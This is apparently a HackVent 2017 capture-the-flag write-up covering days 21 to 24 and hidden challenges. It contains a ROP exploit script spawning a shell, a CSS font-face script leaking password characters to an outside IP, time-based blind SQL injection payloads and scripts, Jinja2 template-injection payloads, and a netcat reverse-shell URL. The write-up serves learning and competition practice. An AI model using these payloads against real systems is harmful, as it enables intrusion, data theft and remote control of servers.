r.sendline(payload)

# Exit the program
print r.recvuntil("[ch01c3]>")
r.sendline("2")
print r.recvuntil("[+] bye bye\n")

# Receive the start address
puts_addr = u64(r.recv(6)+"\x00"*2)

# Calculate the start of libc
libc_start = puts_addr - puts_off
print 'puts_addr  = %x' % puts_addr
print 'libc_start = %x' % libc_start

# Get past the first menu item
print r.recvuntil("[ch01c3]>")
r.sendline("1")

# Send the exploit
print r.recvuntil("[f00d]>")
system_addr = libc_start + system_off
binsh_addr  = libc_start + binsh_off

# Create a payload to system("/bin/sh")
payload = padding + p64(popret) + p64(binsh_addr) + p64(system_addr) + p64(main)
r.sendline(payload)

# Exit the program
print r.recvuntil("[ch01c3]>")
r.sendline("2")
print r.recvuntil("[+] bye bye\n")

# Enter interactive mode for the shell
r.interactive()
```

Run it and find the flag:
```
./day21.py
...
$ cd /home/tamagotchi
$ ls
flag  tamagotchi
$ cat flag
HV17-pwn3d-t4m4g0tch3y-thr0ugh-f00d
```

The flag is: HV17-pwn3d-t4m4g0tch3y-thr0ugh-f00d
# Day 22: frozen flag

## Description:

Level: Final

Today's flag is frozen. It's quite cold in Santa's house at the north pole.

Can you help him to unfreeze it?

Provided:

- [frozen_flag.zip](provided/frozen_flag.zip)

## Solution

The provided executable appears to take an file as an input parameter, encrypt it and save the output as the file HV17-flag.  So we need to decrypt the provided file.

Using the [Avast retargetable decompiler](https://retdec.com/), decompile the file to "frozen.c".

Looking at the source, it appears that it uses the [ICE Cipher](https://en.wikipedia.org/wiki/ICE_(cipher)).

```
// Detected cryptographic pattern: ICE__block_cipher__ice_pbox (32-bit, little endian)
int32_t ICE__block_cipher__ice_pbox_at_40a100[32] = {1, 128, 1024, 0x2000, 0x80000, 0x200000, 0x1000000, 0x40000000, 8, 32, 256, 0x4000, 0x10000, 0x800000, 0x4000000, 0x20000000, 4, 16, 512, 0x8000, 0x20000, 0x400000, 0x8000000, 0x10000000, 2, 64, 2048, 0x1000, 0x40000, 0x100000, 0x2000000, -0x80000000}; // 0x40a100
// Detected cryptographic pattern: ICE__block_cipher__ice_smod (32-bit, little endian)
int32_t ICE__block_cipher__ice_smod_at_40a080[16] = {333, 313, 505, 369, 379, 375, 319, 391, 361, 445, 451, 397, 397, 425, 395, 505}; // 0x40a080
// Detected cryptographic pattern: ICE__block_cipher__ice_sxor (32-bit, little endian)
int32_t ICE__block_cipher__ice_sxor_at_40a0c0[16] = {131, 133, 155, 205, 204, 167, 173, 65, 75, 46, 212, 51, 234, 203, 46, 4}; // 0x40a0c0

```
The ICE cipher uses a symmetric key - but what is it?  Using Hopper and a little digging, it appears that the key is "ice-cold":
![ice-cold key](images/day22_ice_cold.png)


A web search shows that there is a [JAVA implementation of the ICE cipher](http://www.darkside.com.au/ice/).

But first, obtain the hexadecimal encoding of the 'HV17-flag' file:
```
$ xxd -c 40 -p HV17-flag 
4617ab7217a4f36a99e44158a26fe53404da6b0c156672df3c4ff9988f8d0e2a
```

Download the file ICEKey.java, and write a program to run the ICE decryption routine, using the encrypted flag as the ciphertext:
```
$ cat Day22.java
import javax.xml.bind.DatatypeConverter;

public class Day22 {
    // IceKey tool obtained from http://www.darkside.com.au/ice/
    private IceKey keytool;

    public static String toHexString(byte[] array) {
        return DatatypeConverter.printHexBinary(array);
    }

    public static byte[] toByteArray(String s) {
        return DatatypeConverter.parseHexBinary(s);
    }

    private static String hexToAscii(String hexStr) {
        StringBuilder output = new StringBuilder("");

        for (int i = 0; i < hexStr.length(); i += 2) {
            String str = hexStr.substring(i, i + 2);
            output.append((char) Integer.parseInt(str, 16));
        }

        return output.toString();
    }

    public static void main(String [] args) {
        // The Hex representation of the file "HV17-flag"
        final String hv17_flag_enc = "4617ab7217a4f36a99e44158a26fe53404da6b0c156672df3c4ff9988f8d0e2a";

        // Plaintext output of the flag
        String flag = "";

        // The encryption key
        final String key = "ice-cold";

        // Place holder for the output
        byte [] output = new byte[8];

        // Determine how many 8 byte blocks there are (4)
        int numBlocks = hv17_flag_enc.length() / (2 * 8);

        // Only one round is used
        int numRounds = 1;

        // Create the keytool
        IceKey keytool = new IceKey(numRounds);
        keytool.set(key.getBytes());

        // Cycle through all blocks
        for (int i = 0; i < numBlocks; i++) {
            // Get the 8 byte substring
            String block = hv17_flag_enc.substring(i*16,(i+1)*16);

            // Decrypt using the decryption tool
            keytool.decrypt(toByteArray(block), output);

            // Build the flag output
            flag = flag + hexToAscii(toHexString(output));
        }

        // Print the flag
        System.out.println("flag = " + flag);
    }
}
```

Run the program and collect the flag:
```
$ javac IceKey.java Day22.java
$ java Day22
flag = HV17-9VmF-xULb-fRVU-pvgb-KhZo 
```

The flag is: HV17-9VmF-xULb-fRVU-pvgb-KhZo
# Day 23: only perl can parse Perl

## Description

Level: Final

... but there is always one more way to approach things!  in doubt, use perl5.10+ on unix

Provided:

- [onlyperl.pl](provided/onlyperl.pl)

## Solution

The file actually runs both as a perl executable and as an msdos program.  In order to get the flag, cracking both is required.

## Stage 1

Well it does not look like perl, but it seems to run with perl.
First try to deofuscate:
```
$ perl -MO=Deobfuscate,-y onlyperl.pl > deob.pl
```

Step through the program with the perl debugger:
```
$ perl -d deob.pl
DB<1> n
DB<1> n
...
main::((eval 9)[deob.pl:8]:1):  ;print("Password:\n");@a=unpack("C*",$,);@b=unpack("C*",$X);@c=unpack("C*",scalar <>);print(chr(($b[$_]-$a[$_]+$c[$_%8]+0x100)&0xFF)) for(0..$#b);print "\nDecryption done, are you happy now?\n";
```

Thus the program can be re-written and instrumented as follows:
```
$ cat debug.pl
#!/usr/bin/env perl

$, = ...
$X = ...
# Show a prompt
print("Password:\n");
@a=unpack("C*",$,);
@b=unpack("C*",$X);

# This line reads the data
@c=unpack("C*",scalar <>);

# Perform the decryption
print(chr(($b[$_]-$a[$_]+$c[$_%8]+0x100)&0xFF)) for(0..$#b);

# Print done
print "\nDecryption done, are you happy now?\n";

# Dump the A variable
print "len(a)=$#a\n";
print "a=";
print("$a[$_], ") for(1..$#a);
print "\n";

# Dump the B variable
print "len(b)=$#b\n";
print "b=";
print("$b[$_], ") for(1..$#b);
print "\n";
```

I feel more comfortable with python then perl, so re-write as the following:
```
$ cat onlyperl.py
#!/usr/bin/env python

import datetime
import itertools
import string

a = [187, 0, 0, 128, 183, 26, 1, 77, 67, 129, 251, 14, 3, 124, 244, 243, 130, 76, 244, 94, 77, 165, 219, 77, 247, 130, 76, 249, 68, 128, 108, 253, 71, 249, 65, 247, 93, 78, 139, 75, 93, 78, 133, 128, 108, 247, 129, 76, 249, 68, 128, 108, 205, 115, 92, 78, 69, 56, 34, 243, 175, 76, 244, 67, 77, 165, 39, 77, 247, 175, 76, 249, 68, 128, 108, 253, 71, 249, 65, 247, 66, 73, 139, 75, 66, 73, 133, 128, 108, 247, 129, 76, 249, 68, 128, 108, 205, 115, 93, 73, 72, 56, 14, 124, 150, 243, 77, 77, 199, 193, 189, 76, 196, 189, 254, 69, 187, 190, 197, 174, 79, 194, 95, 78, 205, 164, 195, 197, 134, 199, 194, 67, 79, 196, 189, 254, 72, 187, 190, 197, 174, 127, 194, 92, 73, 197, 193, 189, 76, 11, 204, 179, 83, 77, 49, 157, 247, 189, 76, 249, 68, 128, 108, 247, 129, 76, 249, 68, 128, 108, 249, 1, 128, 108, 246, 77, 77, 196, 149, 72, 103, 77, 125, 77, 14, 116, 134, 49, 185, 142, 77, 77, 77, 64, 71, 105, 89, 88, 65, 16, 6, 16, 17, 92, 15, 31, 10, 11, 12, 21, 7, 16, 77, 86, 85, 89, 88, 65, 36, 44, 49, 93, 31, 16, 26, 28, 66, 91, 94, 175, 214, 84, 27, 21, 233, 2, 103, 23, 194, 20, 201, 229, 243, 29, 88, 181, 105, 153, 11, 50, 177, 174, 170, 2, 213, 18, 240, 41, 136, 0, 217, 27, 74, 148, 169, 179, 118, 226, 4, 220, 83, 82, 142, 208, 172, 89, 234, 252, 216, 76, 215, 254, 3, 133, 64, 37, 161, 214, 88, 197, 11, 182, 45, 183, 186, 236, 145, 242, 232, 34, 160, 85, 131, 164, 219, 224, 174, 15, 33, 231, 109, 62, 180, 184, 87, 178, 246, 110, 227, 31, 47, 149, 93, 79, 77, 218, 181, 254, 101, 209, 125, 54, 155, 22, 103, 68, 97, 251, 14, 177, 94, 253, 70, 136, 223, 28, 32, 102, 146, 243, 35, 39, 51, 170, 171, 25, 210, 175, 20, 141, 140, 129, 233, 17, 204, 7, 194, 66, 156, 167, 44, 190, 111, 189, 98, 150, 46, 221, 137, 222, 200, 154, 48, 213, 193, 241, 138, 143, 100, 81, 117, 239, 49, 126, 176, 13, 188, 238, 53, 163, 24, 72, 12, 95, 212, 245, 165, 162, 119, 207, 96, 8, 144, 36, 128, 60, 92, 41, 80, 57, 130, 192, 40, 58, 211, 202, 124, 113, 105, 247, 235, 55, 134, 157, 56, 191, 114, 9, 206, 203, 225, 158, 249, 168, 67, 38, 26, 121, 61, 237, 173, 228, 106, 23, 19, 86, 185, 91, 127, 112, 69, 42, 198, 90, 63, 52, 196, 244, 1, 71, 65, 166, 240, 153, 229, 59, 132, 75, 84, 199, 99, 139, 5, 195, 147, 21, 230, 152, 122, 10, 50, 151, 159, 2, 135, 120, 16, 43, 107, 205, 104, 123, 248, 6, 115, 250, 18, 78, 29, 30, 73, 108, 201, 116, 187 ]
b = [147, 38, 197, 62, 125, 34, 250, 66, 70, 126, 248, 8, 201, 126, 244, 243, 63, 147, 240, 70, 90, 102, 229, 72, 252, 127, 65, 242, 66, 65, 105, 248, 70, 52, 62, 236, 93, 15, 130, 70, 95, 40, 90, 121, 106, 171, 139, 71, 254, 52, 135, 104, 216, 108, 13, 78, 61, 105, 42, 154, 183, 78, 241, 72, 253, 229, 32, 70, 252, 99, 64, 230, 66, 112, 112, 229, 82, 0, 55, 163, 34, 126, 145, 62, 26, 231, 99, 117, 95, 57, 132, 70, 1, 62, 133, 31, 208, 99, 106, 53, 1, 59, 11, 108, 70, 54, 73, 57, 204, 193, 110, 60, 195, 242, 5, 236, 194, 193, 202, 90, 68, 8, 88, 67, 134, 163, 194, 192, 141, 183, 133, 63, 91, 202, 125, 236, 65, 249, 129, 188, 172, 133, 191, 22, 227 ]

def foo(s, i):
    return chr((b[i] - a[i] + ord(s[i%8]) + 0x100) & 0xff)

def decrypt(s):
    output = ''
    s = s * (((8 / len(s)) + 1))
    output = ''.join([foo(s,i) for i in range(len(b))])
    return output

def main():
    print "Password:"
    user_input = raw_input()

    print decrypt(user_input)
    print "\nDecryption done, are you happy now?\n";

if __name__ == '__main__':
    main()
```

We know a few things:

- The password is 8 characters
- The flag (hopefully) begins with "HV17-"

Thus we can write a solver that assumes the beginning of the plaintext is "HV17-" and uses that to determine the first five characters of the key.  Then brute-force the remaining three characters. 

```
#!/usr/bin/env python

import onlyperl
import itertools
import string
    
def guess_key(c, i):
    return chr((ord(c) + onlyperl.a[i] - onlyperl.b[i] - 0x100) & 0xff)
    
def guess_keystr(s):
    return ''.join([guess_key(s[i], i) for i in xrange(len(s))])
    
def main():
    first_part = guess_keystr('HV17-')
    print 'First part is: %s' % first_part

    # Only guess [a-zA-Z0-9]
    allowed_chars = string.ascii_letters + string.digits

    combos = itertools.permutations(allowed_chars, 3) 

    for combo in combos:
        guess = first_part + ''.join(combo)
        result = onlyperl.decrypt(guess)
        if 'this' in result:
            print 'key = %s' % guess
            print result

if __name__ == '__main__':
    main()
```

Running this reveals the key and a false flag:

```
$ pypy ./day23.py 
First part is: p0lyg
key = p0lyglot
HV17-this-is-not-what-you-are-looking-for
Are you sure that only perl can parse Perl?
Microsoft's ye old shell does not even know /usr/bin/perl.
```

## Stage 2

First of all, give the file a ".com" extension:

```
$ cp onlyperl.pl onlyperl.com
```

Download the [dosbox source code](https://github.com/Henne/dosbox-svn) and configure with debugging.

```
$ git clone https://github.com/Henne/dosbox-svn.git
$ cd dosbox-svn
$ ./autogen.sh
$ ./configure --enable-debug
$ make
```

Launch the dosbox and launch the executable using the debugger:
```
Z:>mount c ~/CURRENT/HackVent2017/day23
C:>debug.com onlyperl.com
```

The [most useful debugger commmands](https://www.vogons.org/viewtopic.php?t=3944):

- F5: Continue execution
- F9: Toggle Breakpoint
- F10: Step Over
- F11: Step Into

Through stepping through the code, the length of the second password is five characters.
My first guess? SANTA!

It does not work, but at least the first character was an "H".
After trial and error, determine that the password is "S4n7A" enter it to get the flag:

```
C:\>onlyperl.com
>> perl password: p0lyglot
>> DOS code: S4n7A
HV17-OVze-IUGF-W2xs-x2uE-pVRU
```

The flag is: HV17-OVze-IUGF-W2xs-x2uE-pVRU
# Day 24: Chatterbox... likes to talk

## Description

Level: Final

I love to chat secure and private.

For this I mostly use http://challenges.hackvent.hacking-lab.com:1087.

It's easy to create a private chat and start chatting without a registration.

Hint #1: the admin is a lazy clicker boy and only likes <a href="..."></a>

Hint #2: As a passionate designer, the admin loves different fonts.

Hint #3: For step 2: I'd better be my own CA.

Hint #4: For step 2: It's all about the state

Hint #5: For step 3: python programmers don't need {{ ninjas }}

Provided:

- [Chatterbox website](http://challenges.hackvent.hacking-lab.com:1087)

## Solution

### Stage 1

This one was difficult and had me stumped until the first two hints were revealed:

- Hint #1: the admin is a lazy clicker boy and only likes <a href="..."></a>
- Hint #2: As a passionate designer, the admin loves different fonts.

Hint #1 suggests that the admin actually clicks on links that you send him, which in turn suggests the use of the feedback page.

Hint #2 suggests something to do with fonts.  A google search of "cascading style sheet font vulnerability"
comes up with a [hackernews posting](https://news.ycombinator.com/item?id=10490960) to an article titled [CSS based Attack: Abusing unicode-range of font-face](http://mksben.l0.cm/2015/10/css-based-attack-abusing-unicode-range.html).

So, first download the [original css file](http://challenges.hackvent.hacking-lab.com:1087/css/styles.css)

Create entries in the css that take advantage of the fontface vulnerability.
I used the following script to automate:

```
$ cat day24.py
#!/usr/bin/env python

import string

def char_to_hex(c):
    return format(ord(c), 'x')

def print_css(c):
    print "@font-face{"
    print "    font-family:poc;";
    print "    src: url(http://XXX.XXX.XXX.XXX:8000/?%s);" % c
    print "    unicode-range:U+00%s;" % char_to_hex(c)
    print "}"

def print_pwsection():
    print "#password {"
    print "    font-family:poc;"
    print "}"

def main():
    for c in string.ascii_letters + string.digits:
        print_css(c)
    print_pwsection()

if __name__ == '__main__':
    main()
```

XXX.XXX.XXX.XXX is a publicly addressable IP address.

On a VM running at that location, start up a webserver:
```
$ python -m SimpleHTTPServer
```
Add the output of the script to the provided css file.

Create a private chat and get the link:
http://158.69.216.53:1087/private_chat.php?secret=6f1618340d71601975f83fae5473dc6bf1a6761015ab98ab61fd7b6e69180272

Open the chat link, and then open the feedback page in a new browser tab.

In the feedback panel enter the following text:

```
<A HREF="http://158.69.216.53:1087/private_chat.php?secret=6f1618340d71601975f83fae5473dc6bf1a6761015ab98ab61fd7b6e69180272">link</A>
```

The admin will navigate to the private chat, and the following is received on my web server:

```
158.69.216.53 - - [24/Dec/2017 21:17:56] "GET /?C HTTP/1.1" 200 -
158.69.216.53 - - [24/Dec/2017 21:17:56] "GET /?h HTTP/1.1" 200 -
158.69.216.53 - - [24/Dec/2017 21:17:56] "GET /?r HTTP/1.1" 200 -
158.69.216.53 - - [24/Dec/2017 21:17:56] "GET /?i HTTP/1.1" 200 -
158.69.216.53 - - [24/Dec/2017 21:17:56] "GET /?s HTTP/1.1" 200 -
158.69.216.53 - - [24/Dec/2017 21:17:56] "GET /?t HTTP/1.1" 200 -
158.69.216.53 - - [24/Dec/2017 21:17:56] "GET /?m HTTP/1.1" 200 -
158.69.216.53 - - [24/Dec/2017 21:17:56] "GET /?a HTTP/1.1" 200 -
158.69.216.53 - - [24/Dec/2017 21:17:56] "GET /?2 HTTP/1.1" 200 -
158.69.216.53 - - [24/Dec/2017 21:17:56] "GET /?0 HTTP/1.1" 200 -
158.69.216.53 - - [24/Dec/2017 21:17:56] "GET /?1 HTTP/1.1" 200 -
158.69.216.53 - - [24/Dec/2017 21:17:56] "GET /?7 HTTP/1.1" 200 -
```

The password is "Christmas2017".  Enter that into the Login form to get stage 2:

Good Job. Now keep going!

challenges.hackvent.hacking-lab.com:1088?key=E7g24fPcZgL5dg78

### Stage 2

The hints are:

- Hint #3: For step 2: I'd better be my own CA.
- Hint #4: For step 2: It's all about the state

These hints suggest to use the CSR (Certificate Signing Request) and specifically the state field.

So I wrote a script to do some testing by hand:
```
$ cat day24.sh 
#!/bin/sh

# Variables
SERVER=my
KEYFILE=${SERVER}.key
CSR=${SERVER}.csr
KEYSIZE=1024
URL="http://challenges.hackvent.hacking-lab.com:1088/php/api.php?function=csr&a
rgument='&key=E7g24fPcZgL5dg78"
OUT=${SERVER}.cert.html
CERT=${SERVER}.cert

# Clean up previous runs
rm my*

# Generate a key
openssl genrsa -out ${KEYFILE} ${KEYSIZE}

# Generate the Certificate Signing Request (CSR)
openssl req -new -key ${KEYFILE} -out ${CSR} 

# URL encode the request
CSR_ENC=`cat $CSR | sed -e s/\+/%2B/g | sed -e 's/\//%2F/g' | sed -e s/\ /\+/g 
| sed -e 's/\=/%3D/g' | sed -e ':a;N;$!ba;s/\n/%0A/g' | sed -e "s/'/%27/g"`

# Send the request to the webserver
curl -X POST $URL -o $OUT -d "csr=$CSR_ENC"

# Convert from HTML to text
html2text -o $CERT $OUT

# Display the received cert
openssl x509 -text -in ${CERT} | more
```

Run the script in one window, and Wireshark (or tshark in another).

The following suggests a SQL error occurred:

```
$ ./day24.sh
...
State or Province Name (full name) [Some-State]:A'
...
$ tshark -i wlp1s0 "port 1088"
...
36 336.651303660 80.74.140.188 → 192.168.0.110 HTTP 251 52854 HTTP/1.0 500 Internal Server Error
```

The following suggests that the SQL injection was successful:
```
$ ./day24.sh
...
State or Province Name (full name) [Some-State]:A' OR '
...
$ tshark -i wlp1s0 "port 1088"
...
46 598.978112116 80.74.140.188 → 192.168.0.110 HTTP 1747 52878 HTTP/1.1 200 OK  (text/html)
```

With a little trial and error it becomes apparent that the "State" field in the certificate
is vulnerable to SQL injection, that the backend is MySQL and that unfortunately there
is nothing useful output in the generated certificate.  So in other words, *blind SQL injection*.

When doing blind SQL injection, the general technique is to try to match one character at a time
by using a time-based command like sleep.

For example, enter the following into the State field to check for the table_schema:
```
' OR (select sleep(10) from  information_schema.tables where table_schema like 'a%') OR '
```

This returns quickly - there are no schemas that begin with the letter 'a'.
Repeat this a few times until we get to the letter 'h' which takes 10 seconds to finish.

Then get the next letter by repeating the same steps starting with 'ha' and going through the alphabet.
```
' OR (select sleep(10) from  information_schema.tables where table_schema like 'ha%') OR '
```

After repeating these steps, it can be determined that the schema name is 'hv24_2':

To double check, enter the following:
```
' OR (select sleep(10) from information_schema.tables where table_schema = 'hv24_2') OR '
```

Schema name found, next step - identify the tables.  Typing by hand is getting slow,
so time to make another script!

```
$ cat day24_2.sh
#!/bin/bash

# Variables
SERVER=my
KEYFILE=${SERVER}.key
CSR=${SERVER}.csr
KEYSIZE=1024
URL="http://challenges.hackvent.hacking-lab.com:1088/php/api.php?function=csr&argument='&key=E7g24fPcZgL5dg78"
OUT=${SERVER}.cert.html
CERT=${SERVER}.cert

foo='abcdefghijklmnopqrstuvwxyz1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ_'

for (( i=0; i<${#foo}; i++ )); do

    char=${foo:$i:1}
    echo "Trying $char"

    # Clean up previous runs
    rm my*

    # Generate a key
    openssl genrsa -out ${KEYFILE} ${KEYSIZE}

    # Find tables
    ST="' OR (select sleep(10) from information_schema.tables where table_name like '$char%' && table_schema='hv24_2') OR '"

    echo $ST

    # Generate the Certificate Signing Request (CSR)
    openssl req -new -key ${KEYFILE} -out ${CSR} -subj "/C=US/ST=\"$ST\"/L=Test/O=Test/OU=Test/CN=Test/emailAddress=Test"

    # URL encode the request
    CSR_ENC=`cat $CSR | sed -e s/\+/%2B/g | sed -e 's/\//%2F/g' | sed -e s/\ /\+/g | sed -e 's/\=/%3D/g' | sed -e ':a;N;$!ba;s/\n/%0A/g' | sed -e "s/'/%27/g"`

    # Send the request to the webserver
    date
    curl -X POST $URL -o $OUT -d "csr=$CSR_ENC"
    date

done
```

On the first run it pauses at 'c' and 'k'.  Modify the script to start with 'c', and iteratively go through.
It would be much easier writing a Python script to do this without changing the script every time, but hey it was late.

By doing this many times, the table names are determined:

- certificates
- keystorage

Key storage sounds more interesting than certificates to me.

Modify the script again, to find the column names:
```
    # Find columns
    ST="' OR (select sleep(10) from information_schema.columns where table_name like 'keystorag%' && column_name like '$char%') OR '"
```

NOTE: I have no idea why, but "AND" did not work in the above query, but "&&" did.

After some more repetition, the column name is determined:
- private_key

Modify the script yet again to get the value in the column:
```
ST="' OR (select sleep(3) from hv24_2.keystorage where private_key like '$char%') OR '"
```

After a few iterations we find: challenges_hackvent_hacking-lab_com_1089_key_

But it starts to complain the string is too long.  No problem, change the script to:
```
ST="' OR (select sleep(3) from hv24_2.keystorage where private_key like '%_key_$char%') OR '"
```

And finally we get the whole string:

challenges_hackvent_hacking-lab_com_1089_key_w5zzcusgzty9cngw

But it does not work!  Oops - apparently "like" is not case sensitive.  After a little digging, the 'binary' keyword helps.
```
ST="' OR (select sleep(3) from hv24_2.keystorage where private_key like binary '%_key_$char%') OR '"
```

After all is said and done, we get the correct case of the key, and finally to step 3:
http://challenges.hackvent.hacking-lab.com:1089/?key=W5zzcusgZty9CNgw


### Stage 3

Hint #5: For step 3: python programmers don't need {{ ninjas }}

Ninjas is a hint to the [Jinja python template engine](http://jinja.pocoo.org/).
A google search for "Jinja vulnerability" results in [Exploring SSTI in Flask/Jinja2](https://nvisium.com/blog/2016/03/09/exploring-ssti-in-flask-jinja2/).

A quick test shows that the site is vulnerable:

Enter the URL 

```
http://challenges.hackvent.hacking-lab.com:1089/{{2+2}}?key=W5zzcusgZty9CNgw
```

And the error message shows:
```
Oops! That page doesn't exist.
http://challenges.hackvent.hacking-lab.com:1089/4/99?key=W5zzcusgZty9CNgw
```

Notice that it added "2 + 2" and showed the result "4".

Inject the following:

```
{{ ''.__class__.__mro__[2].__subclasses__() }}
```

To learn all the classes that are loaded:
```
Oops! That page doesn't exist.
http://challenges.hackvent.hacking-lab.com:1089/[<class 'member_descriptor'>, <class 'bytearray'>, <class '_frozen_importlib.BuiltinImporter'>, <class 'contextlib.ExitStack'>, <class 'werkzeug.serving.WSGIRequestHandler'>, <class 'jinja2.runtime.Macro'>, <class 'collections.abc.Iterable'>, <class 'sre_parse.Tokenizer'>, <class 'codecs.Codec'>, <class '_thread.lock'>, <class 'logging.BufferingFormatter'>, 
...
```

In particular the following is promising!
```
<class 'subprocess.Popen'>
```

We can run a process to create a reverse shell.

On my server start netcat:
```
nc -l 9999
```
And then enter the magical URL to start the reverse shell:
```
http://challenges.hackvent.hacking-lab.com:1089/{{''.__class__.__mro__[1].__subclasses__()[37](["nc","-e","/bin/sh","xxx.xxx.xxx.xxx","9999"])}}/99?key=W5zzcusgZty9CNgw
```

Once the session is established, with a little digging, the flag is found:

```
cd home
ls
flag
cat flag
HV17-7h1s-1sju-t4ra-nd0m-flag
```

Finally!

The flag is: HV17-7h1s-1sju-t4ra-nd0m-flag
# Hidden Challenges

## Hidden 1

Navigate to the daily challenge page and fiddle with the day parameter.

Notice that by going to [day 1984](https://hackvent.hacking-lab.com/challenge.php?day=1984),
the following message is received:

*The resource you are trying to access, is hidden in the header.*

Use firefox web developer tools, network traffic to inspect the header of the response.

The flag is: HV17-4llw-aysL-00ki-nTh3-H34d

## Hidden 2

This appears in the Day 18 challenge.
Use the [RPCS3 Emulator](https://rpcs3.net/), and select File -> Boot Self/Elf, and choose "hackvent.self" to get a hidden flag:

![hidden flag 2](images/hidden2_flag.png)

The flag is: HV17-Muq9-gzvU-t3Bg-O3jo-iGml

## Hidden 3

Navigate to the [HackVent robots.txt page](https://hackvent.hacking-lab.com/robots.txt):

```
We are people, not machines
```

Do a google search for "We are people, not machines", which brings us to [http://humanstxt.org/](http://humanstxt.org/).

Navigate to the [Hackvent humans.txt page](https://hackvent.hacking-lab.com/humans.txt):

```
All credits go to the following incredibly awesome HUMANS (in alphabetic order):
avarx
DanMcFly
HaRdLoCk
inik
Lukasz
M.
Morpheuz
MuffinX
PS
pyth0n33

HV17-bz7q-zrfD-XnGz-fQos-wr2A
```
The flag is: HV17-bz7q-zrfD-XnGz-fQos-wr2A

## Hidden 4

Use [Burp Suite]() as a proxy to view the web site.
Notice that there is a file in css/egg.png

![egg.png](images/egg.png)

Use the [ZXing QR Decoder](https://zxing.org/w/decode.jspx) to read the barcode.

The flag is: HE17-W3ll-T00E-arly-forT-his!


## Hidden 5

Open up wireshark and start a network capture.
In a terminal window, connect to the challenges server via telnet:
```
$ telnet challenges.hackvent.hacking-lab.com
```

A pretty ASCII art animation is shown, and the hidden flag is shown briefly.
In the wireshark window, follow the TCP stream, select show and save the data as "ASCII",
and save the date to a file.

Open it up in a text editor to show the relevant portions:
```
       __   __  __   __  _   ___  __   __                                
      |  | |  ||  | |  || | |   ||  |_|  |                               
      |  | |  ||  |_|  || |_|   ||       |                               
      |  |_|  ||       ||       ||       |                               
      |       ||       ||___    | |     |                                
      |       ||   _   |    |   ||   _   |                               
      |_______||__| |__|    |___||__| |__|                               
                                                                         
       _______  _______  ___      _______                                
      |       ||       ||   |    |       |                               
      |    _  ||    _  ||   |    |    ___|                               
      |   |_| ||   |_| ||   |    |   |___                                
      |    ___||    ___||   |___ |    ___|                               
      |   |    |   |    |       ||   |___                                
      |___|    |___|    |_______||_______|                               
                                                                         
       _______  __    _  __    _  ______                                 
      |   _   ||  |  | ||  |  | ||      |                                
      |  |_|  ||   |_| ||   |_| ||  _    |                               
      |       ||       ||       || | |   |                               
      |       ||  _    ||  _    || |_|   |                               
      |   _   || | |   || | |   ||       |                               
      |__| |__||_|  |__||_|  |__||______|                                
                                                                         
       ___   __   __  _   ___  __   __                                   
      |   | |  | |  || | |   ||  |_|  |                                  
      |   | |  |_|  || |_|   ||       |                                  
      |   | |       ||       ||       |                                  
      |   | |       ||___    | |     |                                   
      |   | |   _   |    |   ||   _   |                                  
      |___| |__| |__|    |___||__| |__|                                  
                                                                         
       _______  ____   __   __  _______                                  
      |       ||    | |  |_|  ||       |                                 
      |_     _| |   | |       ||    ___|                                 
        |   |   |   | |       ||   |___                                  
        |   |   |   | |       ||    ___|                                 
        |   |   |   | | ||_|| ||   |___                                  
        |___|   |___| |_|   |_||_______|                                 
                                        
```
The flag is: HV17-UH4X-PPLE-ANND-IH4X-T1ME
